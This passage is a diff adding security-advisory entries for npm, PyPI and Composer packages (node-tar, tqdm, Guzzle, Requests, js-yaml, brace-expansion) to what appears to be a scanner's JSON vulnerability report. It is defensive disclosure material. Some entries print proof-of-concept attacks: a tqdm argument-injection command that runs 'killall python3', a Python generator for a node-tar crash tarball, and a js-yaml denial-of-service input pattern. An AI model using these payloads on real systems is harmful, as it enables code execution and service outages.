Lu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=5e2c0d4b4de40373ac0fe91908c2659141a6dd4ab850271cc26042a3885c82ea)\n\n## Note\nThis report was originally reported to GitHub bug bounty program, they asked me to report it to you a month ago",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-28863"
+        }
+      ],
+      "published": "2024-03-22T16:57:05Z",
+      "updated": "2026-02-04T04:39:20Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/node-tar"
+        },
+        {
+          "ref": "pkg:npm/tar"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-f886-m6hf-6m8v",
+      "references": [
+        {
+          "id": "CVE-2026-33750",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "description": "brace-expansion: Zero-step sequence causes process hang and memory exhaustion",
+      "detail": "### Impact\n\nA brace pattern with a zero step value (e.g., `{1..2..0}`) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory.\n\nThe loop in question:\n\nhttps://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184\n\n`test()` is one of\n\nhttps://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113\n\nThe increment is computed as `Math.abs(0) = 0`, so the loop variable never advances. On a test machine, the process hangs for about 3.5 seconds and allocates roughly 1.9 GB of memory before throwing a `RangeError`. Setting max to any value has no effect because the limit is only checked at the output combination step, not during sequence generation.\n\nThis affects any application that passes untrusted strings to expand(), or by error sets a step value of `0`. That includes tools built on minimatch/glob that resolve patterns from CLI arguments or config files. The input needed is just 10 bytes.\n\n### Patches\n\n\nUpgrade to versions\n- 5.0.5+\n\nA step increment of 0 is now sanitized to 1, which matches bash behavior.\n\n### Workarounds\n\nSanitize strings passed to `expand()` to ensure a step value of `0` is not used.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33750"
+        }
+      ],
+      "published": "2026-03-26T18:29:42Z",
+      "updated": "2026-03-27T22:14:21Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/brace-expansion"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-g446-98w2-8p5w",
+      "references": [
+        {
+          "id": "CVE-2026-59883",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+        }
+      ],
+      "description": "Guzzle: Cookie Disclosure and Injection via IP-Address Domains",
+      "detail": "### Impact\n\n`CookieJar` does not restrict a cookie scoped to an IP address to the exact host that set it. When a stored cookie's `Domain` attribute is an IPv4 literal (`Domain=192.168.0.1`), a bracketed IPv6 literal (`Domain=[::1]`), or a bare numeric value that denotes an IPv4 address (`Domain=1`, which is `0.0.0.1`), `SetCookie::matchesDomain()` applies ordinary subdomain (suffix) matching to it instead of requiring an exact host. The IP-address check inside `matchesDomain()` is applied only to the request host and never to the cookie's own domain, and response cookies that carry an explicit `Domain` attribute are stored as suffix-matchable. As a result Guzzle sends such a cookie to any host whose name ends in that value as a trailing label, for example sending a `Domain=192.168.0.1` cookie to `evil.192.168.0.1`, or a `Domain=1` cookie to `evil.1`. The same flaw lets a look-alike host store a cookie that Guzzle then sends to the bare IP address. Depending on how the receiving service interprets the cookie, the impact is cross-host cookie disclosure, cookie injection, or session fixation.\n\nYou are affected if your application uses Guzzle's cookie support, for example `new Client(['cookies' =\u003e true])` or an explicit `CookieJar`, reuses one cookie jar across more than one host or trust boundary, and that jar can hold a cookie scoped to an IP-address or bare-numeric host. To actually leak a cookie the application must also resolve and connect to a look-alike host whose name ends in the IP-address label, such as `evil.192.168.0.1`. Such names are not publicly registrable, so in practice an attacker needs some influence over name resolution, which is realistic on private, split-horizon, container, or development networks. You are not affected if you do not use Guzzle's cookie support, if you use a separate cookie jar per host or trust boundary, or if your jars never hold cookies scoped to IP-address or bare-numeric hosts. This issue is independent of public suffix list validation. Per RFC 6265, an IP-address cookie domain must match only the exact host that set it and must never match a subdomain.\n\n### Patches\n\nThe issue is patched in `7.12.3` and later. Starting in that release, Guzzle matches an IPv4 literal, a bracketed IPv6 literal, or a bare-numeric cookie `Domain` only against the exact request host, and no longer applies subdomain suffix matching to them.\n\n### Workarounds\n\nIf you cannot upgrade immediately, do not reuse one `CookieJar` instance across untrusted and trusted origins. Use a separate cookie jar per host or trust boundary, or disable cookie handling for requests to untrusted hosts, and avoid scoping cookies to IP-address or bare-numeric hosts. In particular, avoid `new Client(['cookies' =\u003e true])` for any client that may contact unrelated hosts at different trust levels, because that option creates a single shared jar for the whole client.\n\n### References\n\n* https://datatracker.ietf.org/doc/html/rfc6265#section-5.1.3\n* https://datatracker.ietf.org/doc/html/rfc6265#section-5.3\n* https://url.spec.whatwg.org/#concept-ipv4-parser",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59883"
+        }
+      ],
+      "published": "2026-07-20T22:00:09Z",
+      "updated": "2026-07-20T22:15:23Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:composer/guzzlehttp/guzzle"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-g7vv-2v7x-gj9p",
+      "references": [
+        {
+          "id": "CVE-2024-34062",
+          "source": {}
+        },
+        {
+          "id": "PYSEC-2026-1976",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N"
+        }
+      ],
+      "description": "tqdm CLI arguments injection attack",
+      "detail": "### Impact\nAny optional non-boolean CLI arguments (e.g. `--delim`, `--buf-size`, `--manpath`) are passed through python's `eval`, allowing arbitrary code execution. Example:\n\n```sh\npython -m tqdm --manpath=\"\\\" + str(exec(\\\"import os\\nos.system('echo hi \u0026\u0026 killall python3')\\\")) + \\\"\"\n```\n\n### Patches\nhttps://github.com/tqdm/tqdm/commit/4e613f84ed2ae029559f539464df83fa91feb316 released in `tqdm\u003e=4.66.3`\n\n### Workarounds\nNone\n\n### References\n- https://github.com/tqdm/tqdm/releases/tag/v4.66.3",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-34062"
+        }
+      ],
+      "published": "2024-05-03T19:33:28Z",
+      "updated": "2026-07-07T17:56:20Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:pypi/tqdm"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-gc5v-m9x4-r6x2",
+      "references": [
+        {
+          "id": "CVE-2026-25645",
+          "source": {}
+        },
+        {
+          "id": "PYSEC-2026-2275",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:N/I:H/A:N"
+        }
+      ],
+      "description": "Requests has Insecure Temp File Reuse in its extract_zipped_paths() utility function",
+      "detail": "### Impact\nThe `requests.utils.extract_zipped_paths()` utility function uses a predictable filename when extracting files from zip archives into the system temporary directory. If the target file already exists, it is reused without validation. A local attacker with write access to the temp directory could pre-create a malicious file that would be loaded in place of the legitimate one.\n\n### Affected usages\n**Standard usage of the Requests library is not affected by this vulnerability.** Only applications that call `extract_zipped_paths()` directly are impacted.\n\n### Remediation\nUpgrade to at least Requests 2.33.0, where the library now extracts files to a non-deterministic location.\n\nIf developers are unable to upgrade, they can set `TMPDIR` in their environment to a directory with restricted write access.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-25645"
+        }
+      ],
+      "published": "2026-03-25T16:56:28Z",
+      "updated": "2026-07-13T07:26:34Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:pypi/requests"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-gvwx-54wh-qm9j",
+      "references": [
+        {
+          "id": "CVE-2026-59875",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        }
+      ],
+      "description": "node-tar: Uncaught Exception DoS via NUL byte in PAX path/linkpath records",
+      "detail": "## Summary\n\n`node-tar` strips trailing `NUL` bytes from long-name (`L`) and long-linkpath (`K`) GNU extended headers but does **not** apply the same sanitization to equivalent fields delivered via PAX (`x` typeflag) extended headers. A PAX record of the form `path=visible.txt\\x00hidden.txt` is parsed verbatim into `entry.path` and flows into `fs.lstat()` / `fs.open()`, which Node.js core rejects with `ERR_INVALID_ARG_VALUE`. The throw originates inside an `FSReqCallback` async chain that is **not** wrapped by the consumer's `await/try-catch` around `tar.x()` — it surfaces as `uncaughtException` and terminates the process.\n\nThis is a remote denial-of-service primitive against any process that extracts attacker-supplied tarballs through `tar.x` / `tar.extract` / `tar.t` / `tar.Parser`, even when the consumer follows the documented `try/catch` error-handling pattern.\n\nA secondary parser-differential (CWE-436) exists because `tar(1)`, `bsdtar`, and Python `tarfile` truncate the path at the first `NUL` (yielding `visible.txt`) while node-tar retains the full string. A validator that pre-scans a tarball with one tool and extracts with the other is bypassed.\n\n---\n\n## Root cause\n\n### Vulnerable sink — `src/pax.ts:157-183`\n\nPAX KV records flow through `parseKVLine`. The value half (`v`) is assigned directly to the result object with no sanitization for embedded NUL bytes:\n\n```ts\n// src/pax.ts:157\nconst parseKVLine = (set: Record\u003cstring, unknown\u003e, line: string) =\u003e {\n  const n = parseInt(line, 10)\n  if (n !== Buffer.byteLength(line) + 1) return set\n  line = line.slice((n + ' ').length)\n  const kv = line.split('=')\n  const r = kv.shift()\n  if (!r) return set\n  const k = r.replace(/^SCHILY\\.(dev|ino|nlink)/, '$1')\n  const v = kv.join('=')                                 // \u003c-- NO NUL STRIP\n  set[k] =\n    /^([A-Z]+\\.)?([mac]|birth|creation)time$/.test(k) ?\n      new Date(Number(v) * 1000)\n    : /^[0-9]+$/.test(v) ? +v\n    : v                                                  // \u003c-- v with NULs lands here\n  return set\n}\n```\n\nThe PAX record body is length-prefixed, so the parser knows the exact byte boundary — but it never checks whether the value half between `=` and `\\n` contains `NUL`. The result is consumed by `Header` / `ReadEntry`, where `entry.path` and `entry.linkpath` carry the embedded NUL all the way to `fs.lstat()`.\n\n### Correctly-patched cousin sink — `src/parse.ts:375-388`\n\nThe equivalent code path for GNU L/K long-headers **does** strip NUL bytes:\n\n```ts\n// src/parse.ts:375\ncase 'NextFileHasLongPath':\ncase 'OldGnuLongPath': {\n  const ex = this[EX] ?? Object.create(null)\n  this[EX] = ex\n  ex.path = this[META].replace(/\\0.*/, '')               // \u003c-- NUL strip applied\n  break\n}\ncase 'NextFileHasLongLinkpath': {\n  const ex = this[EX] || Object.create(null)\n  this[EX] = ex\n  ex.linkpath = this[META].replace(/\\0.*/, '')           // \u003c-- NUL strip applied\n  break\n}\n```\n\nThe `parse.ts` fix is the maintainer's own acknowledgement that path strings on this codepath must be NUL-stripped before reaching `fs.*`. The PAX path produces the identical primitive but bypasses the guard.\n\n### Downstream blast radius\n\n`entry.path` and `entry.linkpath` are consumed in:\n- `src/unpack.ts` → `fs.lstat`, `fs.open`, `fs.symlink`, `fs.link`, `fs.mkdir`\n- `src/list.ts` (no crash — listing tolerates NUL in strings)\n- Any consumer of the `ReadEntry` event that calls `path.join()` / `fs.*` on `entry.path`\n\nThe crash fires inside the FSReqCallback Node-internal async machinery, **outside** the user's `await tar.x(...)` Promise rejection boundary.\n\n---\n\n## Proof of Concept\n\n### Artifacts\n- `poc-null-byte-crash.tar` — 3072 bytes — PAX `path=visible.txt\\x00hidden.txt`\n- `poc-null-linkpath-crash.tar` — 2560 bytes — PAX `linkpath=target\\x00garbage` (symlink target sink)\n- `poc1-pax-prefix.py` — minimal PAX-header builder (Python 3, no deps)\n\n### Tarball generator (minimal repro — Python 3)\n\n```python\n#!/usr/bin/env python3\n\"\"\"Minimal PAX-NUL-injection tarball generator for node-tar PoC.\"\"\"\nimport os\n\ndef cksum(b):\n    s = 0\n    for i, x in enumerate(b):\n        s += 0x20 if 148 \u003c= i \u003c 156 else x\n    return s\n\ndef pad512(buf):\n    rem = len(buf) % 512\n    return buf + b'\\0' * (512 - rem) if rem else buf\n\ndef hdr(name, size, typeflag, prefix=b'', linkpath=b''):\n    b = bytearray(512)\n    b[0:len(name[:100])] = name[:100]\n    b[100:108] = b'0000644\\0'\n    b[108:116] = b'0001000\\0'\n    b[116:124] = b'0001000\\0'\n    b[124:136] = ('%011o ' % size).encode()\n    b[136:148] = ('%011o ' % 0).encode()\n    b[148:156] = b'        '\n    b[156:157] = typeflag\n    b[157:157+len(linkpath[:100])] = linkpath[:100]\n    b[257:265] = b'ustar\\x0000'\n    b[265:270] = b'root\\0'\n    b[297:302] = b'root\\0'\n    b[329:337] = b'0000000\\0'\n    b[337:345] = b'0000000\\0'\n    b[345:345+len(prefix[:155])] = prefix[:155]\n    s = cksum(b)\n    b[148:156] = ('%06o\\0 ' % s).encode()\n    return bytes(b)\n\ndef pax(records):\n    body = b''\n    for k, v in records:\n        kv = b' ' + k + b'=' + v + b'\\n'\n        for digits in range(1, 8):\n            total = digits + len(kv)\n            if len(str(total)) == digits:\n                break\n        body += str(total).encode() + kv\n    return pad512(hdr(b'PaxHeader/poc', len(body), b'x') + body)\n\nout  = pax([(b'path', b'visible.txt\\x00hidden.txt')])  # NUL in PAX path\nout += hdr(b'placeholder', 1, b'0')\nout += pad512(b'A')\nout += b'\\0' * 1024  # end-of-archive\n\nopen('poc.tar', 'wb').write(out)\n```\n\n### Reproduction\n\n```bash\n# 1. Generate tarball\npython3 poc1-pax-prefix.py          # writes poc.tar (3 KB)\n\n# 2. Install vulnerable version\nmkdir repro \u0026\u0026 cd repro\nnpm init -y \u0026\u0026 npm install tar@7.5.16\n\n# 3. Try to extract with documented try/catch — observe uncaught exception\nmkdir -p ./out\nnode --input-type=module -e '\n  process.on(\"uncaughtException\", e =\u003e {\n    console.log(\"UNCAUGHT:\", e.code, \"-\", e.message);\n    process.exit(99);\n  });\n  import(\"tar\").then(async tar =\u003e {\n    try {\n      await tar.x({ file: \"../poc.tar\", cwd: \"./out\" });\n      console.log(\"NORMAL_RETURN\");\n    } catch (e) {\n      console.log(\"CAUGHT_BY_USER:\", e.code);\n    }\n  });'\n```\n\n### Observed output (verified 2026-06-23 against `tar@7.5.16`)\n\n```\nUNCAUGHT: ERR_INVALID_ARG_VALUE - The argument 'path' must be a string,\nUint8Array, or URL without null bytes.\nReceived '/.../out/visible.txt\\x00hidden.txt'\nexit: 99\n```\n\nThe exception bypasses the user's `try { await tar.x(...) } catch (e) { ... }` block and lands in the global `uncaughtException` handler. In a typical server without that handler, the process exits.\n\n---\n\n## Impact\n\n### Direct: remote DoS\n\nAny service that ingests attacker-supplied tarballs via node-tar inherits a one-tarball-kills-the-process primitive. Realistic deployments where this is reachable without user interaction:\n\n- npm registry tarball ingestion and downstream mirrors\n- GitHub Actions cache restore (`actions/cache`, `actions/setup-*` extracting toolchains)\n- Container image build pipelines that unpack layer tarballs through node tooling\n- Backup-restore services accepting user uploads\n- CI artifact processors and badge generators\n- Static-site / Docusaurus / Next.js build runners that fetch and extract dep tarballs\n- Cloud functions that auto-extract uploaded archives\n\nA correctly-coded consumer that does:\n\n```js\ntry {\n  await tar.x({ file: req.upload.path, cwd: tmpdir });\n} catch (e) {\n  return res.status(400).json({ error: 'bad archive' });\n}\n```\n\ndoes not catch this throw. The Node process dies and (depending on the supervisor) the worker may take time to respawn or never respawn if it dies during boot.\n\n### Secondary: parser-differential validator bypass (CWE-436)\n\n| Tool                       | Result for `path=visible.txt\\x00hidden.txt` |\n|----------------------------|----------------------------------------------|\n| GNU tar (`tar -tvf`)       | Lists `visible.txt` (truncated at NUL)      |\n| `bsdtar -tvf`              | Lists `visible.txt` (truncated at NUL)      |\n| Python `tarfile.list()`    | Lists `visible.txt\\x00hidden.txt` (raw)     |\n| node-tar `tar.t({file})`   | Emits raw NUL-bearing path (no crash)       |\n| node-tar `tar.x({file})`   | **Crashes** (uncaught throw)                |\n\nA pre-flight validator using GNU tar or bsdtar will see a benign filename; the subsequent node-tar extraction blows up. This is exploitable against any architecture that lists-and-validates-then-extracts.\n\n---\n\n## Suggested patch\n\nMatch the long-name handler in `parse.ts` — strip everything from the first NUL onward in `parseKVLine` value parsing:\n\n```diff\n--- a/src/pax.ts\n+++ b/src/pax.ts\n@@ -173,7 +173,7 @@ const parseKVLine = (set: Record\u003cstring, unknown\u003e, line: string) =\u003e {\n\n   const k = r.replace(/^SCHILY\\.(dev|ino|nlink)/, '$1')\n\n-  const v = kv.join('=')\n+  const v = kv.join('=').replace(/\\0.*$/, '')\n   set[k] =\n     /^([A-Z]+\\.)?([mac]|birth|creation)time$/.test(k) ?\n       new Date(Number(v) * 1000)\n```\n\nThis matches `src/parse.ts:379` and `src/parse.ts:386` and closes both `path` and `linkpath` sinks in one change.\n\nA defense-in-depth follow-up: add an explicit `assert(!v.includes('\\0'))` (or fail-soft `return set`) at the top of `parseKVLine` so malformed PAX records that *aren't* path/linkpath also can't smuggle NUL into other unanticipated consumers (e.g. third-party readers of `entry.header.atime` Date objects constructed from `Number(v)` where `v` had embedded NUL).",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59875"
+        }
+      ],
+      "published": "2026-07-20T21:51:12Z",
+      "updated": "2026-07-21T14:59:36Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/tar"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-h67p-54hq-rp68",
+      "references": [
+        {
+          "id": "CVE-2026-53550",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        }
+      ],
+      "description": "JS-YAML: Quadratic-complexity DoS in merge key handling via repeated aliases",
+      "detail": "### Summary\nA crafted YAML document can trigger algorithmic CPU exhaustion in `js-yaml` merge-key processing (`\u003c\u003c`) by repeating the same alias many times in a merge sequence.  \nThis causes quadratic parse-time behavior relative to input size and can block a Node.js worker/event loop for seconds with a relatively small payload (tens of KB), resulting in denial of service.\n\n### Details\nThe issue is in merge handling inside `lib/loader.js`:\n\n- `storeMappingPair(...)` iterates every element of a merge sequence when key tag is `tag:yaml.org,2002:merge`.\n- For each element, it calls `mergeMappings(...)`.\n- `mergeMappings(...)` computes `Object.keys(source)` and performs `_hasOwnProperty.call(destination, key)` checks for each key.\n\nWhen input is of the form:\n\na: \u0026a {k0:0, k1:0, ..., kK:0}\nb: {\u003c\u003c: [*a, *a, *a, ... repeated M times ...]}\nall *a entries refer to the same anchored object. After the first merge, subsequent merges are semantically no-ops, but the parser still reprocesses all keys each time.\nResulting work is O(K * M), while input size is O(K + M), giving quadratic scaling as payload grows.\nRelevant code path:\nlib/loader.js in storeMappingPair(...) merge branch (keyTag === 'tag:yaml.org,2002:merge')\nlib/loader.js mergeMappings(...)\n\n\n### Root cause\nFile:       lib/loader.js\nFunction:   storeMappingPair(state, _result, overridableKeys, keyTag, keyNode,\n                             valueNode, startLine, startLineStart, startPos)\nLines:      ~359-366\n\n    if (keyTag === 'tag:yaml.org,2002:merge') {\n      if (Array.isArray(valueNode)) {\n        for (index = 0, quantity = valueNode.length; index \u003c quantity; index += 1) {\n          mergeMappings(state, _result, valueNode[index], overridableKeys);\n        }\n      } else {\n        mergeMappings(state, _result, valueNode, overridableKeys);\n      }\n    }\n\nWhen the merge value is a sequence (YAML 1.1 \u003c\u003c: [ *a, *a, ... ]), each element\nis handed to mergeMappings() without deduplication. mergeMappings() then does\n\n    sourceKeys = Object.keys(source);\n    for (index = 0; index \u003c sourceKeys.length; index += 1) {\n      key = sourceKeys[index];\n      if (!_hasOwnProperty.call(destination, key)) {\n        setProperty(destination, key, source[key]);\n        overridableKeys[key] = true;\n      }\n    }\n\nEvery alias reference in the sequence resolves (by design) to the SAME object\nvia state.anchorMap. After the first merge, every subsequent merge of that same\nreference is a pure no-op semantically, but still performs:\n\n  * one Object.keys(source) call (O(K))\n  * K _hasOwnProperty.call checks on the destination\n\nTotal: M * K hasOwnProperty checks + M Object.keys allocations, while the final\nobject and all observable side effects are identical to a single merge.\n\nYAML semantics for `\u003c\u003c:` are idempotent and commutative over duplicate sources,\nso collapsing duplicates preserves behavior exactly; this isn't a spec trade-off.\n\n\n### PoC\nEnvironment:\njs-yaml version: 4.1.1\nNode.js: v24.5.0\nPlatform: arm64 macOS (reproduced consistently)\nReproduction script:\nCreate many keys in one anchored map (\u0026a).\nMerge that same alias repeatedly via \u003c\u003c: [*a, *a, ...].\nMeasure parse time and compare with control payload using single merge (\u003c\u003c: *a).\nObserved repeated runs (same machine):\nK=M=1000, input 9,909 bytes: ~33–36 ms\nK=M=2000, input 20,909 bytes: ~121–123 ms\nK=M=4000, input 42,909 bytes: ~524–537 ms\nK=M=6000, input 64,909 bytes: ~1,608–1,829 ms\nK=M=8000, input 86,909 bytes: ~3,395–3,565 ms\nControl (single merge, similar key counts):\nK=2000: ~1–2 ms\nK=4000: ~3 ms\nK=8000: ~5 ms\nAlso verified: repeated-merge output equals single-merge output (same key count and same JSON), confirming excess time is redundant computation.\n\n\n### Impact\nThis is a denial-of-service vulnerability (CPU exhaustion / algorithmic complexity).\nAny service parsing untrusted YAML with js-yaml can be impacted, including API backends, CI tools, config processors, and automation services. An attacker can submit crafted YAML to significantly increase CPU time and reduce availability.\n\n### Suggested fix:\nDedupe the merge source list by reference before invoking mergeMappings. Any of\nthe following are minimal and preserve YAML 1.1 merge semantics:\n\ndedupe in storeMappingPair:\n\n    if (keyTag === 'tag:yaml.org,2002:merge') {\n      if (Array.isArray(valueNode)) {\n        var seen = new Set();\n        for (index = 0, quantity = valueNode.length; index \u003c quantity; index += 1) {\n          var src = valueNode[index];\n          if (seen.has(src)) continue;   // idempotent; skip redundant alias\n          seen.add(src);\n          mergeMappings(state, _result, src, overridableKeys);\n        }\n      } else {\n        mergeMappings(state, _result, valueNode, overridableKeys);\n      }\n    }",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-53550"
+        }
+      ],
+      "published": "2026-06-15T17:15:07Z",
+      "updated": "2026-06-29T15:15:07Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/js-yaml"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-h95v-h523-3mw8",
+      "references": [],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        }
+      ],
+      "description": "Guzzle: URI fragments disclosed in redirect Referer headers",
+      "detail": "### Impact\n\nWhen the optional `referer` redirect setting is enabled, affected versions of `RedirectMiddleware` can copy the fragment from the referring request URI into a generated `Referer` header. A URI fragment is the part after `#`. It is handled locally by the client and is not part of the HTTP request target, so the server handling the original request does not receive it. A generated `Referer` tells the redirect destination which URI led to the request. Guzzle correctly removes user information from that value, but retains the fragment when it follows a redirect to the same scheme, such as HTTPS to HTTPS. For example, an initial URI ending in `#secret` is sent without the fragment, but the redirect destination can receive a `Referer` ending in `#secret`. This behavior affects both the cURL and stream handlers.\n\nAn attacker who controls the redirect destination can read the fragment from the incoming header, including through request logs or application code. If the fragment contains a one-time login secret, access token, state value, or other private client data, it is disclosed to a server that was never meant to receive it. Exploitation requires the application to enable `allow_redirects.referer`, make a request to a URI with a sensitive fragment, and follow a same-scheme redirect to a less-trusted destination.\n\nThe `referer` setting is disabled by default. Applications that leave it disabled, do not put sensitive data in URI fragments, do not follow redirects, or only redirect within the same trust boundary are not affected. Guzzle already omits the generated header when the scheme changes. This issue is limited to the fragment's inclusion. Reducing the path and query on cross-origin redirects is a separate privacy policy question.\n\n### Patches\n\nThe issue is patched in `7.15.1` and later. Starting in that release, Guzzle removes both user information and the fragment before generating a redirect `Referer` value. Other redirect behavior does not change. Guzzle retains the referring path and query, and continues to omit the header when the scheme changes. Versions before `7.15.1` are affected when the optional `referer` setting is enabled.\n\n### Workarounds\n\nIf you cannot upgrade immediately, leave automatic Referer generation disabled. It is off by default. If redirect options are configured explicitly, ensure that `referer` is `false`:\n\n```php\n$client-\u003erequest('GET', $uri, [\n    'allow_redirects' =\u003e ['referer' =\u003e false],\n]);\n```\n\nAlternatively, disable automatic redirects and follow trusted destinations manually, or remove the fragment from the request URI before sending a request that may redirect. Do not rely on the fact that fragments are absent from the initial HTTP request target, because the affected middleware can reintroduce them in the generated header.\n\n### References\n\n* https://www.rfc-editor.org/rfc/rfc9110.html#section-10.1.3\n* https://www.rfc-editor.org/rfc/rfc3986.html#section-3.5\n* https://www.rfc-editor.org/rfc/rfc9700.html#section-4.2.3",
+      "advisories": [],
+      "published": "2026-07-20T23:28:36Z",
+      "updated": "2026-07-21T20:59:33Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:composer/guzzlehttp/guzzle"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-j8r2-6x86-q33q",
+      "references": [
+        {
+          "id": "CVE-2023-32681",
+          "source": {}
+        },
+        {
+          "id": "PYSEC-2023-74",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N"
+        }
+      ],
+      "description": "Unintended leak of Proxy-Authorization header in requests",
+      "detail": "### Impact\n\nSince Requests v2.3.0, Requests has been vulnerable to potentially leaking `Proxy-Authorization` headers to destination servers, specifically during redirects to an HTTPS origin. This is a product of how `rebuild_proxies` is used to recompute and [reattach the `Proxy-Authorization` header](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/sessions.py#L319-L328) to requests when redirected. Note this behavior has _only_ been observed to affect proxied requests when credentials are supplied in the URL user information component (e.g. `https://username:password@proxy:8080`).\n\n**Current vulnerable behavior(s):**\n\n1. HTTP → HTTPS: **leak**\n2. HTTPS → HTTP: **no leak**\n3. HTTPS → HTTPS: **leak**\n4. HTTP → HTTP: **no leak**\n\nFor HTTP connections sent through the proxy, the proxy will identify the header in the request itself and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the CONNECT request as the proxy has no visibility into further tunneled requests. This results in Requests forwarding the header to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate those credentials.\n\nThe reason this currently works for HTTPS connections in Requests is the `Proxy-Authorization` header is also handled by urllib3 with our usage of the ProxyManager in adapters.py with [`proxy_manager_for`](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/adapters.py#L199-L235). This will compute the required proxy headers in `proxy_headers` and pass them to the Proxy Manager, avoiding attaching them directly to the Request object. This will be our preferred option going forward for default usage.\n\n### Patches\nStarting in Requests v2.31.0, Requests will no longer attach this header to redirects with an HTTPS destination. This should have no negative impacts on the default behavior of the library as the proxy credentials are already properly being handled by urllib3's ProxyManager.\n\nFor users with custom adapters, this _may_ be potentially breaking if you were already working around this behavior. The previous functionality of `rebuild_proxies` doesn't make sense in any case, so we would encourage any users impacted to migrate any handling of Proxy-Authorization directly into their custom adapter.\n\n### Workarounds\nFor users who are not able to update Requests immediately, there is one potential workaround.\n\nYou may disable redirects by setting `allow_redirects` to `False` on all calls through Requests top-level APIs. Note that if you're currently relying on redirect behaviors, you will need to capture the 3xx response codes and ensure a new request is made to the redirect destination.\n```\nimport requests\nr = requests.get('http://github.com/', allow_redirects=False)\n```\n\n### Credits\n\nThis vulnerability was discovered and disclosed by the following individuals.\n\nDennis Brinkrolf, Haxolot (https://haxolot.com/)\nTobias Funke, (tobiasfunke93@gmail.com)",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-32681"
+        }
+      ],
+      "published": "2023-05-22T20:36:32Z",
+      "updated": "2026-02-04T03:34:13Z",
+      "credits": {
+        "organizations": []
